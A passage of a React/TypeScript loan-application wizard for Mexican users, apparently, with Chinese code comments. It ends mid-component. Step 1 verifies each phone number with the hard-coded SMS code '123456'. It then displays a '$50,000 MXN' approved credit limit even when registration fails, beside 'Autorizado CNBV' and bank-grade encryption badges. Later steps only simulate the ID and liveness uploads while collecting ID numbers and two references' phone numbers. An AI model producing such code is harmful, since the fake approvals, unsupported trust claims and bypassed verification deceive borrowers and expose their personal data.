import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { getApiUrl } from '../config/api';
import { httpClient, checkBrowserCompatibility } from '../utils/httpClient';
import { safeStorage, safeDateParse, arrayCompat, smoothScroll } from '../utils/browserCompat';

import { 
  trackLoanApplicationStart, 
  trackLoanApplicationComplete,
  trackFileUpload 
} from '../utils/analytics';

interface LoanApplication {
  id?: string;
  sessionId?: string;
  step: number;
  phone?: string;
  isGuest?: boolean;
  userId?: string;
  // 第2步：身份信息
  idNumber?: string;
  realName?: string;
  // 第4步：联系人信息
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  // 第7步：银行卡
  bankCardNumber?: string;
  // 第11步：提现信息
  withdrawalAmount?: number;
  installmentPeriod?: number;
}

interface StepProps {
  data: LoanApplication;
  onUpdate: (data: Partial<LoanApplication>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
}

// 第1步：用户注册
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [countryCode, setCountryCode] = useState('+52');
  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);

  const countryCodes = [
    // 拉丁美洲国家（优先显示）
    { code: '+52', name: 'México', flag: '🇲🇽' },
    { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
    { code: '+1', name: 'Canadá', flag: '🇨🇦' },
    { code: '+54', name: 'Argentina', flag: '🇦🇷' },
    { code: '+55', name: 'Brasil', flag: '🇧🇷' },
    { code: '+56', name: 'Chile', flag: '🇨🇱' },
    { code: '+57', name: 'Colombia', flag: '🇨🇴' },
    { code: '+58', name: 'Venezuela', flag: '🇻🇪' },
    { code: '+51', name: 'Perú', flag: '🇵🇪' },
    { code: '+593', name: 'Ecuador', flag: '🇪🇨' },
    { code: '+591', name: 'Bolivia', flag: '🇧🇴' },
    { code: '+595', name: 'Paraguay', flag: '🇵🇾' },
    { code: '+598', name: 'Uruguay', flag: '🇺🇾' },
    { code: '+506', name: 'Costa Rica', flag: '🇨🇷' },
    { code: '+507', name: 'Panamá', flag: '🇵🇦' },
    { code: '+503', name: 'El Salvador', flag: '🇸🇻' },
    { code: '+502', name: 'Guatemala', flag: '🇬🇹' },
    { code: '+504', name: 'Honduras', flag: '🇭🇳' },
    { code: '+505', name: 'Nicaragua', flag: '🇳🇮' },
    { code: '+53', name: 'Cuba', flag: '🇨🇺' },
    { code: '+1', name: 'República Dominicana', flag: '🇩🇴' },

    // 欧洲国家
    { code: '+34', name: 'España', flag: '🇪🇸' },
    { code: '+44', name: 'Reino Unido', flag: '🇬🇧' },
    { code: '+33', name: 'Francia', flag: '🇫🇷' },
    { code: '+49', name: 'Alemania', flag: '🇩🇪' },
    { code: '+39', name: 'Italia', flag: '🇮🇹' },
    { code: '+351', name: 'Portugal', flag: '🇵🇹' },
    { code: '+31', name: 'Países Bajos', flag: '🇳🇱' },
    { code: '+41', name: 'Suiza', flag: '🇨🇭' },
    { code: '+43', name: 'Austria', flag: '🇦🇹' },
    { code: '+32', name: 'Bélgica', flag: '🇧🇪' },

    // 亚洲国家
    { code: '+86', name: 'China', flag: '🇨🇳' },
    { code: '+81', name: 'Japón', flag: '🇯🇵' },
    { code: '+82', name: 'Corea del Sur', flag: '🇰🇷' },
    { code: '+91', name: 'India', flag: '🇮🇳' },
    { code: '+65', name: 'Singapur', flag: '🇸🇬' },
    { code: '+60', name: 'Malasia', flag: '🇲🇾' },
    { code: '+66', name: 'Tailandia', flag: '🇹🇭' },
    { code: '+84', name: 'Vietnam', flag: '🇻🇳' },
    { code: '+63', name: 'Filipinas', flag: '🇵🇭' },
    { code: '+62', name: 'Indonesia', flag: '🇮🇩' },

    // 其他重要国家
    { code: '+61', name: 'Australia', flag: '🇦🇺' },
    { code: '+64', name: 'Nueva Zelanda', flag: '🇳🇿' },
    { code: '+27', name: 'Sudáfrica', flag: '🇿🇦' },
    { code: '+20', name: 'Egipto', flag: '🇪🇬' },
    { code: '+971', name: 'Emiratos Árabes Unidos', flag: '🇦🇪' },
    { code: '+966', name: 'Arabia Saudí', flag: '🇸🇦' },
    { code: '+972', name: 'Israel', flag: '🇮🇱' },
    { code: '+90', name: 'Turquía', flag: '🇹🇷' },
    { code: '+7', name: 'Rusia', flag: '🇷🇺' }
  ];

  const handleCheckEligibility = async () => {
    if (!phone) {
      alert(t('errors.phoneRequired'));
      return;
    }

    const fullPhone = countryCode + phone;
    setIsRegistering(true);

    try {
      // 直接进行用户注册（无需验证码）
      console.log('📱 Registering user with phone:', fullPhone);
      
      // 调用verify-sms接口进行用户注册，使用固定验证码
      const result = await httpClient.postJson('/api/auth/verify-sms', {
        phone: fullPhone,
        code: '123456', // 使用固定验证码
        applicationId: data.id
      }) as { 
        success: boolean; 
        error?: string; 
        user?: { id: string; phone: string; phone_verified: boolean };
        token?: string;
        applicationId?: string;
      };

      console.log('✅ User registration result:', result);

      if (result.success) {
        // 显示审批金额
        setShowApprovedAmount(true);
        
        // 用户已注册，申请已转换
        const updatedData = {
          phone: fullPhone,
          isGuest: false, // 现在是注册用户
          id: data.id,
          userId: result.user?.id
        };
        onUpdate(updatedData);

        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: fullPhone, 
            registered: true,
            verified: true,
            userId: result.user?.id
          });
        }

        console.log('✅ User registered successfully');
      } else {
        // 如果注册失败，仍然显示审批金额，但保持访客状态
        setShowApprovedAmount(true);
        const updatedData = {
          phone: fullPhone,
          isGuest: true,
          id: data.id
        };
        onUpdate(updatedData);
        
        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: fullPhone, 
            registered: false,
            verified: false
          });
        }
      }
    } catch (error) {
      console.error('❌ Failed to register user:', error);
      // 如果注册失败，仍然显示审批金额，但保持访客状态
      setShowApprovedAmount(true);
      const updatedData = {
        phone: fullPhone,
        isGuest: true,
        id: data.id
      };
      onUpdate(updatedData);
      
      if (updateApplicationStep) {
        await updateApplicationStep(1, { 
          phone: fullPhone, 
          registered: false,
          verified: false
        });
      }
    } finally {
      setIsRegistering(false);
    }
  };

  const handleContinue = () => {
    onNext();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100">
      {/* 安全认证条 */}
      <div className="bg-slate-800 text-white py-2 px-4">
        <div className="max-w-4xl mx-auto flex items-center justify-center text-sm">
          <div className="flex items-center space-x-6">
            <div className="flex items-center space-x-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <span className="text-slate-300">SSL Encriptado</span>
            </div>
            <div className="flex items-center space-x-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span className="text-slate-300">Autorizado CNBV</span>
            </div>
            <div className="flex items-center space-x-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span className="text-slate-300">Datos Protegidos</span>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 lg:py-12">
        <div className="max-w-2xl mx-auto">
          {/* 主标题区域 */}
          <div className="text-center mb-8 lg:mb-12">
            <h1 className="text-2xl lg:text-3xl font-bold text-slate-800 mb-3">
              ¡Préstamos con Interés Bajo!
            </h1>
            <p className="text-slate-600 text-base lg:text-lg leading-relaxed">
              Ingresa tu número de teléfono para ver tu límite de crédito aprobado
            </p>
            <div className="mt-4 text-sm text-slate-500">
              Su información será protegida con encriptación de grado bancario
            </div>
          </div>

          {/* 表单卡片 */}
          <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden">
            <div className="p-6 lg:p-8">
              {!showApprovedAmount ? (
                <div className="space-y-6">
                  {/* 手机号输入 */}
                  <div>
                    <label className="block text-base font-semibold text-slate-800 mb-3">
                      {t('loanWizard.step1.phoneLabel')}
                    </label>
                    <div className="flex">
                      <select
                        value={countryCode}
                        onChange={(e) => setCountryCode(e.target.value)}
                        className="w-24 lg:w-28 px-3 py-4 border border-slate-300 border-r-0 bg-slate-50 text-slate-700 font-medium focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-slate-800 transition-colors"
                        disabled={showApprovedAmount}
                      >
                        {countryCodes.map((country) => (
                          <option key={country.code} value={country.code}>
                            {country.flag} {country.code}
                          </option>
                        ))}
                      </select>
                      <input
                        type="tel"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        placeholder={t('loanWizard.step1.phonePlaceholder')}
                        className="flex-1 px-4 py-4 border border-slate-300 text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-slate-800 transition-colors"
                        disabled={showApprovedAmount}
                      />
                    </div>
                    <div className="mt-2 text-sm text-slate-500">
                      Verificaremos su número para procesar su solicitud
                    </div>
                  </div>

                  {/* 提交按钮 */}
                  <button
                    onClick={handleCheckEligibility}
                    disabled={!phone || isRegistering}
                    className="w-full py-4 bg-slate-800 text-white font-semibold text-lg rounded-lg hover:bg-slate-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-lg"
                  >
                    {isRegistering ? (
                      <div className="flex items-center justify-center">
                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
                        Procesando solicitud...
                      </div>
                    ) : (
                      'Ver Mi Límite de Crédito'
                    )}
                  </button>

                  {/* 安全提示 */}
                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-4">
                    <div className="flex items-start space-x-3">
                      <svg className="w-5 h-5 text-slate-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                      </svg>
                      <div>
                        <h4 className="font-semibold text-slate-800 text-sm mb-1">Información Segura</h4>
                        <p className="text-slate-600 text-sm leading-relaxed">
                          Sus datos personales están protegidos con tecnología de encriptación SSL de 256 bits, 
                          el mismo estándar utilizado por los bancos más importantes.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-6">
                  {/* 结果展示 */}
                  <div className="text-center py-6">
                    <div className="inline-flex items-center justify-center w-16 h-16 bg-emerald-100 rounded-full mb-4">
                      <svg className="w-8 h-8 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <h3 className="text-xl font-bold text-slate-800 mb-2">
                      ¡Felicidades! Tu límite de crédito es:
                    </h3>
                    <div className="text-4xl lg:text-5xl font-bold text-emerald-600 mb-2">
                      $50,000 <span className="text-2xl lg:text-3xl text-slate-600">MXN</span>
                    </div>
                    <p className="text-slate-600">
                      Préstamo con interés bajo disponible ahora
                    </p>
                    {!data.isGuest && data.userId && (
                      <div className="mt-3 inline-flex items-center px-3 py-1 bg-emerald-100 text-emerald-800 text-sm font-medium rounded-full">
                        <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                        Usuario registrado exitosamente
                      </div>
                    )}
                  </div>
                  
                  {/* 优势展示 */}
                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
                    <h4 className="font-semibold text-slate-800 text-lg mb-4">Beneficios de tu préstamo:</h4>
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="flex items-center space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700">Tasa de interés baja: 15% OFF</span>
                      </div>
                      <div className="flex items-center space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700">Hasta 100,000 pesos de crédito</span>
                      </div>
                      <div className="flex items-center space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700">Sin comisión de procesamiento</span>
                      </div>
                      <div className="flex items-center space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                        <span className="text-slate-700">Pago anticipado sin penalización</span>
                      </div>
                    </div>
                  </div>

                  {/* 继续按钮 */}
                  <button
                    onClick={handleContinue}
                    className="w-full py-4 bg-slate-800 text-white font-semibold text-lg rounded-lg hover:bg-slate-700 transition-colors shadow-lg"
                  >
                    Continuar con mi Solicitud
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* 底部信任标识 */}
          <div className="mt-8 text-center">
            <div className="flex items-center justify-center space-x-8 text-sm text-slate-500">
              <div className="flex items-center space-x-1">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <span>Regulado CNBV</span>
              </div>
              <div className="flex items-center space-x-1">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span>Datos Seguros</span>
              </div>
              <div className="flex items-center space-x-1">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <span>Proceso Transparente</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// 第2步：身份信息
const Step2Identity: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [idNumber, setIdNumber] = useState(data.idNumber || '');
  const [realName, setRealName] = useState(data.realName || '');

  const handleNext = () => {
    if (!idNumber || !realName) {
      alert(t('errors.required'));
      return;
    }
    const stepData = { idNumber, realName };
    onUpdate(stepData);
    if (updateApplicationStep) {
      updateApplicationStep(2, stepData);
    }
    onNext();
  };

  return (
    <div className="space-y-4 sm:space-y-6">
      <div>
        <h3 className="text-xl sm:text-2xl font-bold mb-2">{t('loanWizard.step2.title')}</h3>
        <p className="text-gray-600 text-sm sm:text-base">{t('loanWizard.step2.subtitle')}</p>
      </div>

      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step2.realNameLabel')}
          </label>
          <input
            type="text"
            value={realName}
            onChange={(e) => setRealName(e.target.value)}
            placeholder={t('loanWizard.step2.realNamePlaceholder')}
            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            style={{ maxWidth: "100%" }}
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step2.idNumberLabel')}
          </label>
          <input
            type="text"
            value={idNumber}
            onChange={(e) => setIdNumber(e.target.value)}
            placeholder={t('loanWizard.step2.idNumberPlaceholder')}
            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            maxLength={18}
            style={{ maxWidth: "100%" }}
          />
        </div>
      </div>

      <div className="flex gap-2 sm:gap-3">
        <button
          onClick={onBack}
          className="px-4 sm:px-6 py-2 sm:py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 text-sm sm:text-base"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-4 sm:px-6 py-2 sm:py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm sm:text-base"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第3步：身份证上传
const Step3IdUpload: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [frontUploaded, setFrontUploaded] = useState(false);
  const [backUploaded, setBackUploaded] = useState(false);
  const [frontUploading, setFrontUploading] = useState(false);
  const [backUploading, setBackUploading] = useState(false);
  const [frontFileName, setFrontFileName] = useState('');
  const [backFileName, setBackFileName] = useState('');

  const handleFileUpload = (type: 'front' | 'back', file: File) => {
    if (type === 'front') {
      setFrontUploading(true);
      setFrontFileName(file.name);
      // 模拟上传过程
      setTimeout(() => {
        setFrontUploading(false);
        setFrontUploaded(true);
        // 追踪文件上传事件
        trackFileUpload('id_front', 1);
      }, 2000);
    } else {
      setBackUploading(true);
      setBackFileName(file.name);
      // 模拟上传过程
      setTimeout(() => {
        setBackUploading(false);
        setBackUploaded(true);
        // 追踪文件上传事件
        trackFileUpload('id_back', 1);
      }, 2000);
    }
  };

  const handleFileSelect = (type: 'front' | 'back') => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.onchange = (e) => {
      const file = (e.target as HTMLInputElement).files?.[0];
      if (file) {
        handleFileUpload(type, file);
      }
    };
    input.click();
  };

  const handleNext = () => {
    if (!frontUploaded || !backUploaded) {
      alert(t('errors.required'));
      return;
    }
    const stepData = { frontUploaded, backUploaded };
    if (updateApplicationStep) {
      updateApplicationStep(3, stepData);
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step3.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step3.subtitle')}</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
          <div className="space-y-4">
            <div className="text-4xl text-gray-400">📄</div>
            <div>
              <h4 className="font-medium">{t('loanWizard.step3.front')}</h4>
              <p className="text-sm text-gray-500">{t('loanWizard.step3.frontDesc')}</p>
            </div>
            {frontUploaded ? (
              <div className="space-y-2">
                <div className="text-green-600">✓ {frontFileName}</div>
                <div className="text-xs text-gray-500">{t('loanWizard.step3.uploaded')}</div>
              </div>
            ) : frontUploading ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step3.uploading')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '60%' }}></div>
                </div>
              </div>
            ) : (
              <button
                onClick={() => handleFileSelect('front')}
                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
              >
                {t('loanWizard.step3.uploadButton')}
              </button>
            )}
          </div>
        </div>

        <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
          <div className="space-y-4">
            <div className="text-4xl text-gray-400">📄</div>
            <div>
              <h4 className="font-medium">{t('loanWizard.step3.back')}</h4>
              <p className="text-sm text-gray-500">{t('loanWizard.step3.backDesc')}</p>
            </div>
            {backUploaded ? (
              <div className="space-y-2">
                <div className="text-green-600">✓ {backFileName}</div>
                <div className="text-xs text-gray-500">{t('loanWizard.step3.uploaded')}</div>
              </div>
            ) : backUploading ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step3.uploading')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '60%' }}></div>
                </div>
              </div>
            ) : (
              <button
                onClick={() => handleFileSelect('back')}
                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
              >
                {t('loanWizard.step3.uploadButton')}
              </button>
            )}
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第4步：联系人信息
const Step4Contacts: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [contact1Name, setContact1Name] = useState(data.contact1Name || '');
  const [contact1Phone, setContact1Phone] = useState(data.contact1Phone || '');
  const [contact2Name, setContact2Name] = useState(data.contact2Name || '');
  const [contact2Phone, setContact2Phone] = useState(data.contact2Phone || '');

  const handleNext = () => {
    if (!contact1Name || !contact1Phone || !contact2Name || !contact2Phone) {
      alert(t('errors.required'));
      return;
    }
    const stepData = { contact1Name, contact1Phone, contact2Name, contact2Phone };
    onUpdate(stepData);
    if (updateApplicationStep) {
      updateApplicationStep(4, stepData);
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step4.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step4.subtitle')}</p>
      </div>

      <div className="space-y-6">
        <div className="border rounded-lg p-3 sm:p-4">
          <h4 className="font-semibold mb-3 sm:mb-4">{t('loanWizard.step4.contact1Title')}</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactNameLabel')}
              </label>
              <input
                type="text"
                value={contact1Name}
                onChange={(e) => setContact1Name(e.target.value)}
                placeholder={t('loanWizard.step4.contactNamePlaceholder')}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                style={{ maxWidth: "100%" }}
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactPhoneLabel')}
              </label>
              <input
                type="tel"
                value={contact1Phone}
                onChange={(e) => setContact1Phone(e.target.value)}
                placeholder={t('loanWizard.step4.contactPhonePlaceholder')}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                maxLength={11}
                style={{ maxWidth: "100%" }}
              />
            </div>
          </div>
        </div>

        <div className="border rounded-lg p-3 sm:p-4">
          <h4 className="font-semibold mb-3 sm:mb-4">{t('loanWizard.step4.contact2Title')}</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactNameLabel')}
              </label>
              <input
                type="text"
                value={contact2Name}
                onChange={(e) => setContact2Name(e.target.value)}
                placeholder={t('loanWizard.step4.contactNamePlaceholder')}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                style={{ maxWidth: "100%" }}
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactPhoneLabel')}
              </label>
              <input
                type="tel"
                value={contact2Phone}
                onChange={(e) => setContact2Phone(e.target.value)}
                placeholder={t('loanWizard.step4.contactPhonePlaceholder')}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                maxLength={11}
                style={{ maxWidth: "100%" }}
              />
            </div>
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第5步：活体识别
const Step5LivenessDetection: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [videoUploaded, setVideoUploaded] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [videoFileName, setVideoFileName] = useState('');
  const [showVideoOptions, setShowVideoOptions] = useState(false);

  const startRecording = () => {
    setIsRecording(true);
    // 模拟3秒录制
    setTimeout(() => {
      setIsRecording(false);
      setVideoUploaded(true);
      setVideoFileName('liveness_video_' + Date.now() + '.mp4');
    }, 3000);
  };

  const handleVideoUpload = (file: File) => {
    setIsUploading(true);
    setVideoFileName(file.name);
    // 模拟上传过程
    setTimeout(() => {
      setIsUploading(false);
      setVideoUploaded(true);
    }, 2000);
  };

  const handleVideoSelect = () => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'video/*';
    input.onchange = (e) => {
      const file = (e.target as HTMLInputElement).files?.[0];
      if (file) {
        handleVideoUpload(file);
      }
    };
    input.click();
  };

  const handleNext = () => {
    if (!videoUploaded) {
      alert(t('errors.required'));
      return;
    }
    const stepData = { videoUploaded, videoFileName };
    if (updateApplicationStep) {
      updateApplicationStep(5, stepData);
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step5.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step5.subtitle')}</p>
      </div>

      <div className="text-center">
        <div className="inline-block p-8 border-2 border-dashed border-gray-300 rounded-lg bg-gray-50">
          <div className="space-y-4">
            <div className="text-6xl">📹</div>
            <div>
              <h4 className="font-medium mb-2">{t('loanWizard.step5.livenessTitle')}</h4>
              <p className="text-sm text-gray-500 mb-4">
                {t('loanWizard.step5.livenessDesc')}
              </p>
            </div>

            {videoUploaded ? (
              <div className="space-y-2">
                <div className="text-green-600">✓ {videoFileName}</div>
                <div className="text-xs text-gray-500">{t('loanWizard.step5.livenessComplete')}</div>
              </div>
            ) : isUploading ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step5.uploading')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '70%' }}></div>
                </div>
              </div>
            ) : isRecording ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step5.recordingDesc')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-red-500 h-2 rounded-full animate-pulse" style={{ width: '100%' }}></div>
                </div>
              </div>
            ) : !showVideoOptions ? (
              <button
                onClick={() => setShowVideoOptions(true)}
                className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
              >
                {t('loanWizard.step5.startVerificationButton')}
              </button>
            ) : (
              <div className="space-y-3">
                <button
                  onClick={startRecording}
                  className="block w-full px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
                >
                  {t('loanWizard.step5.startRecordingButton')}
                </button>
                <div className="text-gray-500 text-sm">{t('loanWizard.step5.orText')}</div>
                <button
                  onClick={handleVideoSelect}
                  className="block w-full px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700"
                >
                  {t('loanWizard.step5.uploadVideoButton')}
                </button>
              </div>
            )}
          </div>
        </div>
      </div>

      <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
        <h4 className="font-medium text-yellow-800 mb-2">{t('loanWizard.step5.recordingHintTitle')}</h4>
        <ul className="text-sm text-yellow-700 space-y-1">
          <li>• {t('loanWizard.step5.recordingHint1')}</li>
          <li>• {t('loanWizard.step5.recordingHint2')}</li>
          <li>• {t('loanWizard.step5.recordingHint3')}</li>
          <li>• {t('loanWizard.step5.recordingHint4')}</li>
        </ul>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
